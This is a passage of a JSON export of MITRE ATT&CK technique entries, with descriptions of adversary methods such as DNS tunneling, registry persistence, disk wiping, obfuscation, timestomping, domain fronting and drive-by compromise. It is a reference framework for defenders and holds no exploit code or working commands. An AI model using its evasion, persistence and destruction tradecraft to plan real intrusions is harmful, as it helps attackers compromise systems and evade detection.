extensive.(Citation: Wikipedia OSI) Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\\n\\nICMP communication between hosts is one example.(Citation: Cisco Synful Knock Evolution)\\n Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts; (Citation: Microsoft ICMP) however, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.\", \"id\": \"attack-pattern--c21d5a77-d422-4a69-acd7-2c53c1faa34b\"}, \"attack-pattern--00f90846-cbd1-4fc5-9233-df5c2bf2a662\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-02-20T21:01:25.428Z\", \"name\": \"Archive via Utility\", \"attack_pattern_identifier\": \"T1560.001\", \"modified\": \"2020-03-25T21:54:37.374Z\", \"description\": \"An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party utilities. Many utilities exist that can archive data, including 7-Zip(Citation: 7zip Homepage), WinRAR(Citation: WinRAR Homepage), and WinZip(Citation: WinZip Homepage). Most utilities include functionality to encrypt and/or compress data.\\n\\nSome 3rd party utilities may be preinstalled, such as `tar` on Linux and macOS or `zip` on Windows systems.\", \"id\": \"attack-pattern--00f90846-cbd1-4fc5-9233-df5c2bf2a662\"}, \"attack-pattern--1ecb2399-e8ba-4f6b-8ba7-5c27d49405cf\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2020-01-23T17:46:59.535Z\", \"name\": \"Boot or Logon Autostart Execution\", \"attack_pattern_identifier\": \"T1547\", \"description\": \"Adversaries may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems. Operating systems may have mechanisms for automatically running a program on system boot or account logon.(Citation: Microsoft Run Key)(Citation: MSDN Authentication Packages)(Citation: Microsoft TimeProvider)(Citation: Cylance Reg Persistence Sept 2013)(Citation: Linux Kernel Programming)\\u00a0 These mechanisms may include automatically executing programs that are placed in specially designated directories or are referenced by repositories that store configuration information, such as the Windows Registry. An adversary may achieve the same goal by modifying or extending features of the kernel.\\n\\nSince some boot or logon autostart programs run with higher privileges, an adversary may leverage these to elevate privileges.\", \"modified\": \"2020-10-09T16:05:36.772Z\", \"id\": \"attack-pattern--1ecb2399-e8ba-4f6b-8ba7-5c27d49405cf\"}, \"attack-pattern--0af0ca99-357d-4ba1-805f-674fdfb7bef9\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-02-20T22:10:20.484Z\", \"name\": \"Disk Structure Wipe\", \"attack_pattern_identifier\": \"T1561.002\", \"description\": \"Adversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources. \\n\\nAdversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable. [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) may be performed in isolation, or along with [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) if all sectors of a disk are wiped.\\n\\nTo maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)\", \"modified\": \"2020-03-28T23:00:00.367Z\", \"id\": \"attack-pattern--0af0ca99-357d-4ba1-805f-674fdfb7bef9\"}, \"attack-pattern--d1fcf083-a721-4223-aedf-bf8960798d62\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-03-09T14:12:31.196Z\", \"name\": \"Windows Command Shell\", \"attack_pattern_identifier\": \"T1059.003\", \"modified\": \"2020-03-28T17:02:13.722Z\", \"description\": \"Adversaries may abuse the Windows command shell for execution. The Windows command shell (<code>cmd.exe</code>) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. \\n\\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\\n\\nAdversaries may leverage <code>cmd.exe</code> to execute various commands and payloads. Common uses include <code>cmd.exe /c</code> to execute a single command, or abusing <code>cmd.exe</code> interactively with input and output forwarded over a command and control channel.\", \"id\": \"attack-pattern--d1fcf083-a721-4223-aedf-bf8960798d62\"}, \"attack-pattern--57340c81-c025-4189-8fa0-fc7ede51bae4\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:31:23.587Z\", \"name\": \"Modify Registry\", \"attack_pattern_identifier\": \"T1112\", \"description\": \"Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\\n\\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility [Reg](https://attack.mitre.org/software/S0075) may be used for local or remote Registry modification. (Citation: Microsoft Reg) Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\\n\\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via [Reg](https://attack.mitre.org/software/S0075) or other utilities using the Win32 API. (Citation: Microsoft Reghide NOV 2006) Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence. (Citation: TrendMicro POWELIKS AUG 2014) (Citation: SpectorOps Hiding Reg Jul 2017)\\n\\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system. (Citation: Microsoft Remote) Often [Valid Accounts](https://attack.mitre.org/techniques/T1078) are required, along with access to the remote system's [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) for RPC communication.\", \"modified\": \"2020-08-13T20:02:49.641Z\", \"id\": \"attack-pattern--57340c81-c025-4189-8fa0-fc7ede51bae4\"}, \"attack-pattern--c726e0a2-a57a-4b7b-a973-d0f013246617\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-03-16T15:30:57.711Z\", \"name\": \"Compile After Delivery\", \"attack_pattern_identifier\": \"T1027.004\", \"modified\": \"2020-03-29T20:59:32.293Z\", \"description\": \"Adversaries may attempt to make payloads difficult to discover and analyze by delivering files to victims as uncompiled code. Text-based source code files may subvert analysis and scrutiny from protections targeting executables/binaries. These payloads will need to be compiled before execution; typically via native utilities such as csc.exe or GCC/MinGW.(Citation: ClearSky MuddyWater Nov 2018)\\n\\nSource code payloads may also be encrypted, encoded, and/or embedded within other files, such as those delivered as a [Phishing](https://attack.mitre.org/techniques/T1566). Payloads may also be delivered in formats unrecognizable and inherently benign to the native OS (ex: EXEs on macOS/Linux) before later being (re)compiled into a proper executable binary with a bundled compiler and execution framework.(Citation: TrendMicro WindowsAppMac)\", \"id\": \"attack-pattern--c726e0a2-a57a-4b7b-a973-d0f013246617\"}, \"attack-pattern--1c34f7aa-9341-4a48-bfab-af22e51aca6c\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-03-13T21:13:10.467Z\", \"name\": \"Local Data Staging\", \"attack_pattern_identifier\": \"T1074.001\", \"modified\": \"2020-05-26T19:23:54.854Z\", \"description\": \"Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.\", \"id\": \"attack-pattern--1c34f7aa-9341-4a48-bfab-af22e51aca6c\"}, \"attack-pattern--3ccef7ae-cb5e-48f6-8302-897105fbf55c\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-12-14T16:46:06.044Z\", \"name\": \"Deobfuscate/Decode Files or Information\", \"attack_pattern_identifier\": \"T1140\", \"description\": \"Adversaries may use [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.\\n\\nOne such example is use of [certutil](https://attack.mitre.org/software/S0160) to decode a remote access tool portable executable file that has been hidden inside a certificate file. (Citation: Malwarebytes Targeted Attack against Saudi Arabia) Another example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload. (Citation: Carbon Black Obfuscation Sept 2016)\\n\\nSometimes a user's action may be required to open it for deobfuscation or decryption as part of [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016)\", \"modified\": \"2020-07-09T14:42:23.122Z\", \"id\": \"attack-pattern--3ccef7ae-cb5e-48f6-8302-897105fbf55c\"}, \"attack-pattern--b3d682b6-98f2-4fb0-aa3b-b4df007ca70a\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:32.662Z\", \"name\": \"Obfuscated Files or Information\", \"attack_pattern_identifier\": \"T1027\", \"description\": \"Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \\n\\nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also used compressed or archived scripts, such as JavaScript. \\n\\nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016)\\n\\nAdversaries may also obfuscate commands executed from payloads or directly via a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017)(Citation: PaloAlto EncodedCommand March 2017) \", \"modified\": \"2020-09-16T19:24:20.601Z\", \"id\": \"attack-pattern--b3d682b6-98f2-4fb0-aa3b-b4df007ca70a\"}, \"attack-pattern--1996eef1-ced3-4d7f-bf94-33298cabbf72\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-03-15T16:27:31.768Z\", \"name\": \"DNS\", \"attack_pattern_identifier\": \"T1071.004\", \"description\": \"Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \\n\\nThe DNS protocol serves an administrative function in computer networking and thus may be very common in environments. DNS traffic may also be allowed even before network authentication is completed. DNS packets contain many fields and headers in which data can be concealed. Often known as DNS tunneling, adversaries may abuse DNS to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.(Citation: PAN DNS Tunneling)(Citation: Medium DnsTunneling) \", \"modified\": \"2020-10-21T16:26:34.196Z\", \"id\": \"attack-pattern--1996eef1-ced3-4d7f-bf94-33298cabbf72\"}, \"attack-pattern--005a06c6-14bf-4118-afa0-ebcd8aebb0c9\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2019-11-27T14:58:00.429Z\", \"name\": \"Scheduled Task\", \"attack_pattern_identifier\": \"T1053.005\", \"description\": \"Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The <code>schtasks</code> can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.\\n\\nThe deprecated [at](https://attack.mitre.org/software/S0110) utility could also be abused by adversaries (ex: [At (Windows)](https://attack.mitre.org/techniques/T1053/002)), though <code>at.exe</code> can not access tasks created with <code>schtasks</code> or the Control Panel.\\n\\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account (such as SYSTEM).\", \"modified\": \"2020-03-24T13:45:03.730Z\", \"id\": \"attack-pattern--005a06c6-14bf-4118-afa0-ebcd8aebb0c9\"}, \"attack-pattern--03d7999c-1f4c-42cc-8373-e7690d318104\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:35.733Z\", \"name\": \"System Owner/User Discovery\", \"attack_pattern_identifier\": \"T1033\", \"modified\": \"2020-03-15T01:03:47.866Z\", \"description\": \"Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from [System Owner/User Discovery](https://attack.mitre.org/techniques/T1033) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\\n\\nUtilities and commands that acquire this information include <code>whoami</code>. In Mac and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>.\", \"id\": \"attack-pattern--03d7999c-1f4c-42cc-8373-e7690d318104\"}, \"attack-pattern--ce0687a0-e692-4b77-964a-0784a8e54ff1\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2020-10-01T01:56:24.776Z\", \"name\": \"Obtain Capabilities\", \"attack_pattern_identifier\": \"T1588\", \"description\": \"Before compromising a victim, adversaries may buy and/or steal capabilities that can be used during targeting. Rather than developing their own capabilities in-house, adversaries may purchase, freely download, or steal them. Activities may include the acquisition of malware, software (including licenses), exploits, certificates, and information relating to vulnerabilities. Adversaries may obtain capabilities to support their operations throughout numerous phases of the adversary lifecycle.\\n\\nIn addition to downloading free malware, software, and exploits from the internet, adversaries may purchase these capabilities from third-party entities. Third-party entities can include technology companies that specialize in malware and exploits, criminal marketplaces, or from individuals.(Citation: NationsBuying)(Citation: PegasusCitizenLab)\\n\\nIn addition to purchasing capabilities, adversaries may steal capabilities from third-party entities (including other adversaries). This can include stealing software licenses, malware, SSL/TLS and code-signing certificates, or raiding closed databases of vulnerabilities or exploits.(Citation: DiginotarCompromise)\", \"modified\": \"2020-10-22T18:22:21.135Z\", \"id\": \"attack-pattern--ce0687a0-e692-4b77-964a-0784a8e54ff1\"}, \"attack-pattern--799ace7f-e227-4411-baa0-8868704f2a69\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:55.892Z\", \"name\": \"Indicator Removal on Host\", \"attack_pattern_identifier\": \"T1070\", \"description\": \"Adversaries may delete or alter generated artifacts on a host system, including logs or captured files such as quarantined malware. Locations and format of logs are platform or product-specific, however standard operating system logs are captured as Windows events or Linux/macOS files such as [Bash History](https://attack.mitre.org/techniques/T1139) and /var/log/*.\\n\\nThese actions may interfere with event collection, reporting, or other notifications used to detect intrusion activity. This that may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.\", \"modified\": \"2020-10-16T18:09:49.074Z\", \"id\": \"attack-pattern--799ace7f-e227-4411-baa0-8868704f2a69\"}, \"attack-pattern--7bc57495-ea59-4380-be31-a64af124ef18\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:31:04.710Z\", \"name\": \"File and Directory Discovery\", \"attack_pattern_identifier\": \"T1083\", \"modified\": \"2020-09-16T16:02:16.770Z\", \"description\": \"Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\\n\\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>. (Citation: Windows Commands JPCERT) Custom tools may also be used to gather file and directory information and interact with the [Native API](https://attack.mitre.org/techniques/T1106).\", \"id\": \"attack-pattern--7bc57495-ea59-4380-be31-a64af124ef18\"}, \"attack-pattern--c32f7008-9fea-41f7-8366-5eb9b74bd896\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:25.584Z\", \"name\": \"Query Registry\", \"attack_pattern_identifier\": \"T1012\", \"description\": \"Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\\n\\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security.(Citation: Wikipedia Windows Registry) Information can easily be queried using the [Reg](https://attack.mitre.org/software/S0075) utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from [Query Registry](https://attack.mitre.org/techniques/T1012) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\", \"modified\": \"2020-03-26T18:08:20.049Z\", \"id\": \"attack-pattern--c32f7008-9fea-41f7-8366-5eb9b74bd896\"}, \"attack-pattern--731f4f55-b6d0-41d1-a7a9-072a66389aea\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:31:08.479Z\", \"name\": \"Proxy\", \"attack_pattern_identifier\": \"T1090\", \"description\": \"Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use these types of proxies to manage command and control communications, reduce the number of simultaneous outbound network connections, provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion. Adversaries may chain together multiple proxies to further disguise the source of malicious traffic.\\n\\nAdversaries can also take advantage of routing schemes in Content Delivery Networks (CDNs) to proxy command and control traffic.\", \"modified\": \"2020-10-21T17:54:28.531Z\", \"id\": \"attack-pattern--731f4f55-b6d0-41d1-a7a9-072a66389aea\"}, \"attack-pattern--e7cbc1de-1f79-48ee-abfd-da1241c65a15\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-10-01T02:11:47.237Z\", \"name\": \"Code Signing Certificates\", \"attack_pattern_identifier\": \"T1588.003\", \"description\": \"Before compromising a victim, adversaries may buy and/or steal code signing certificates that can be used during targeting. Code signing is the process of digitally signing executables and scripts to confirm the software author and guarantee that the code has not been altered or corrupted. Code signing provides a level of authenticity for a program from the developer and a guarantee that the program has not been tampered with.(Citation: Wikipedia Code Signing) Users and/or security tools may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is.\\n\\nPrior to [Code Signing](https://attack.mitre.org/techniques/T1553/002), adversaries may purchase or steal code signing certificates for use in operations. The purchase of code signing certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity. Adversaries may also steal code signing materials directly from a compromised third-party.\", \"modified\": \"2020-10-22T18:22:21.007Z\", \"id\": \"attack-pattern--e7cbc1de-1f79-48ee-abfd-da1241c65a15\"}, \"attack-pattern--47f2d673-ca62-47e9-929b-1b0be9657611\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-01-31T12:42:44.103Z\", \"name\": \"Timestomp\", \"attack_pattern_identifier\": \"T1070.006\", \"modified\": \"2020-03-29T21:39:46.724Z\", \"description\": \"Adversaries may modify file time attributes to hide new or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder. This is done, for example, on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools.\\n\\nTimestomping may be used along with file name [Masquerading](https://attack.mitre.org/techniques/T1036) to hide malware and tools.(Citation: WindowsIR Anti-Forensic Techniques)\", \"id\": \"attack-pattern--47f2d673-ca62-47e9-929b-1b0be9657611\"}, \"attack-pattern--355be19c-ffc9-46d5-8d50-d6a036c675b6\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:56.776Z\", \"name\": \"Application Layer Protocol\", \"attack_pattern_identifier\": \"T1071\", \"description\": \"Adversaries may communicate using application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \\n\\nAdversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP. \", \"modified\": \"2020-10-21T16:35:45.986Z\", \"id\": \"attack-pattern--355be19c-ffc9-46d5-8d50-d6a036c675b6\"}, \"attack-pattern--cc3502b5-30cc-4473-ad48-42d51a6ef6d1\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-03-09T14:38:24.334Z\", \"name\": \"Python\", \"attack_pattern_identifier\": \"T1059.006\", \"description\": \"Adversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the <code>python.exe</code> interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.\\n\\nPython comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors.\", \"modified\": \"2020-06-23T19:03:15.180Z\", \"id\": \"attack-pattern--cc3502b5-30cc-4473-ad48-42d51a6ef6d1\"}, \"attack-pattern--1988cc35-ced8-4dad-b2d1-7628488fa967\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2020-02-20T22:02:20.372Z\", \"name\": \"Disk Wipe\", \"attack_pattern_identifier\": \"T1561\", \"description\": \"Adversaries may wipe or corrupt raw disk data on specific systems or in large numbers in a network to interrupt availability to system and network resources. With direct write access to a disk, adversaries may attempt to overwrite portions of disk data. Adversaries may opt to wipe arbitrary portions of disk data and/or wipe disk structures like the master boot record (MBR). A complete wipe of all disk sectors may be attempted.\\n\\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disks may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Novetta Blockbuster Destructive Malware)\", \"modified\": \"2020-03-28T23:00:00.599Z\", \"id\": \"attack-pattern--1988cc35-ced8-4dad-b2d1-7628488fa967\"}, \"attack-pattern--53ac20cd-aca3-406e-9aa0-9fc7fdc60a5a\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2020-02-20T20:53:45.725Z\", \"name\": \"Archive Collected Data\", \"attack_pattern_identifier\": \"T1560\", \"description\": \"An adversary may compress and/or encrypt data that is collected prior to exfiltration. Compressing the data can help to obfuscate the collected data and minimize the amount of data sent over the network. Encryption can be used to hide information that is being exfiltrated from detection or make exfiltration less conspicuous upon inspection by a defender.\\n\\nBoth compression and encryption are done prior to exfiltration, and can be performed using a utility, 3rd party library, or custom method.\", \"modified\": \"2020-10-21T16:36:55.831Z\", \"id\": \"attack-pattern--53ac20cd-aca3-406e-9aa0-9fc7fdc60a5a\"}, \"attack-pattern--365be77f-fc0e-42ee-bac8-4faf806d9336\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-01-24T14:38:49.266Z\", \"name\": \"Msiexec\", \"attack_pattern_identifier\": \"T1218.007\", \"modified\": \"2020-06-20T22:38:14.154Z\", \"description\": \"Adversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi).(Citation: Microsoft msiexec) Msiexec.exe is digitally signed by Microsoft.\\n\\nAdversaries may abuse msiexec.exe to launch local or network accessible MSI files. Msiexec.exe can also execute DLLs.(Citation: LOLBAS Msiexec)(Citation: TrendMicro Msiexec Feb 2018) Since it is signed and native on Windows systems, msiexec.exe can be used to bypass application control solutions that do not account for its potential abuse.\", \"id\": \"attack-pattern--365be77f-fc0e-42ee-bac8-4faf806d9336\"}, \"attack-pattern--ca9d3402-ada3-484d-876a-d717bd6e05f2\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-03-14T23:29:19.581Z\", \"name\": \"Domain Fronting\", \"attack_pattern_identifier\": \"T1090.004\", \"description\": \"Adversaries may take advantage of routing schemes in Content Delivery Networks (CDNs) and other services which host multiple domains to obfuscate the intended destination of HTTPS traffic or traffic tunneled through HTTPS. (Citation: Fifield Blocking Resistent Communication through domain fronting 2015) Domain fronting involves using different domain names in the SNI field of the TLS header and the Host field of the HTTP header. If both domains are served from the same CDN, then the CDN may route to the address specified in the HTTP header after unwrapping the TLS header. A variation of the the technique, \\\"domainless\\\" fronting, utilizes a SNI field that is left blank; this may allow the fronting to work even when the CDN attempts to validate that the SNI and HTTP Host fields match (if the blank SNI fields are ignored).\\n\\nFor example, if domain-x and domain-y are customers of the same CDN, it is possible to place domain-x in the TLS header and domain-y in the HTTP header. Traffic will appear to be going to domain-x, however the CDN may route it to domain-y.\", \"modified\": \"2020-09-16T19:30:54.226Z\", \"id\": \"attack-pattern--ca9d3402-ada3-484d-876a-d717bd6e05f2\"}, \"attack-pattern--457c7820-d331-465a-915e-42f85500ccc4\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2018-04-18T17:59:24.739Z\", \"name\": \"Signed Binary Proxy Execution\", \"attack_pattern_identifier\": \"T1218\", \"description\": \"Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed binaries. Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files.\", \"modified\": \"2020-10-21T18:37:15.275Z\", \"id\": \"attack-pattern--457c7820-d331-465a-915e-42f85500ccc4\"}, \"attack-pattern--d742a578-d70e-4d0e-96a6-02a9c30204e6\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2018-04-18T17:59:24.739Z\", \"name\": \"Drive-by Compromise\", \"attack_pattern_identifier\": \"T1189\", \"description\": \"Adversaries may gain access to a system through a user visiting a website over the normal course of browsing. With this technique, the user's web browser is typically targeted for exploitation, but adversaries may also use compromised websites for non-exploitation behavior such as acquiring [Application Access Token](https://attack.mitre.org/techniques/T1550/001).\\n\\nMultiple ways of delivering exploit code to a browser exist, including:\\n\\n* A legitimate website is compromised where adversaries have injected some form of malicious code such as JavaScript, iFrames, and cross-site scripting.\\n* Malicious ads are paid for and served through legitimate ad providers.\\n* Built-in web application interfaces are leveraged for the insertion of any other kind of object that can be used to display web content or contain a script that executes on the visiting client (e.g. forum posts, comments, and other user controllable web content).\\n\\nOften the website used by an adversary is one visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted attack is referred to a strategic web compromise or watering hole attack. There are several known examples of this occurring.(Citation: Shadowserver Strategic Web Compromise)\\n\\nTypical drive-by compromise process:\\n\\n1. A user visits a website that is used to host the adversary controlled content.\\n2. Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version. \\n    * The user may be required to assist in this process by enabling scripting or active website components and ignoring warning dialog boxes.\\n3. Upon finding a vulnerable version, exploit code is delivered to the browser.\\n4. If exploitation is successful, then it will give the adversary code execution on the user's system unless other protections are in place.\\n    * In some cases a second visit to the website after the initial scan is required before exploit code is delivered.\\n\\nUnlike [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), the focus of this technique is to exploit software on a client endpoint upon visiting a website. This will commonly give an adversary access to systems on the internal network instead of external systems that may be in a DMZ.\\n\\nAdversaries may also use compromised websites to deliver a user to a malicious application designed to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s, like OAuth tokens, to gain access to protected applications and information. These malicious applications have been delivered through popups on legitimate websites.(Citation: Volexity OceanLotus Nov 2017)\", \"modified\": \"2020-03-29T23:48:15.056Z\", \"id\": \"attack-pattern--d742a578-d70e-4d0e-96a6-02a9c30204e6\"}, \"attack-pattern--22905430-4901-4c2a-84f6-98243cb173f8\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2020-02-26T17:41:25.933Z\", \"name\": \"Hide Artifacts\", \"attack_pattern_identifier\": \"T1564\", \"description\": \"Adversaries may attempt to hide artifacts associated with their behaviors to evade detection. Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system. Adversaries may abuse these features to hide artifacts such as files, directories, user accounts, or other system activity to evade detection.(Citation: Sofacy Komplex Trojan)(Citation: Cybereason OSX Pirrit)(Citation: MalwareBytes ADS July 2015)\\n\\nAdversaries may also attempt to hide artifacts associated with malicious behavior by creating computing regions that are isolated from common security instrumentation, such as through the use of virtualization technology.(Citation: Sophos Ragnar May 2020)\", \"modified\": \"2020-09-23T11:31:50.636Z\", \"id\": \"attack-pattern--22905430-4901-4c2a-84f6-98243cb173f8\"}, \"attack-pattern--389735f1-f21c-4208-b8f0-f8031e7169b8\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2018-01-16T16:13:52.465Z\", \"name\": \"Browser Extensions\", 